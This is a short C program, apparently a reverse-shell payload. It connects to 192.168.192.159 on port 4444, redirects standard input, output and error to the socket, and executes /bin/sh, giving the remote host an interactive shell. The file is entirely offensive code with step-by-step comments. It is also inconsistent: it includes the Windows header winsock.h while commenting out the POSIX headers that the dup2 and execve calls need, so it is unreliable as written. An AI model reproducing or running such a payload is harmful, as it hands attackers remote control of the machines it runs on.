#define _GNU_SOURCE // # added to avoid gcc's implicit declaration of function warning
#include <stdio.h>
#include <sys/types.h>
#include <winsock.h> // w
// #include <unistd.h>
// #include <unistd.h>
// #include <netinet/in.h>
// #include <sys/socket.h>

int main() {
    // define struct saddress
    struct sockaddr_in saddress;
    int socketid;

    // declare struct variables (remote host IP address, port..)
    saddress.sin_family = AF_INET;
    saddress.sin_addr.s_addr = inet_addr("192.168.192.159");
    saddress.sin_port = htons(4444);

    // create socket
    socketid = socket(AF_INET, SOCK_STREAM, 0);

    // connect to remote IP address/port
    connect(socketid, (struct sockaddr *)&saddress, sizeof(saddress));

    // copy STDIN, STDOUT and STDERR to socket
    dup2(socketid, 0);
    dup2(socketid, 1);
    dup2(socketid, 2);

    // execute /bin/sh 
    execve("/bin/sh", 0, 0);
    return 0;
}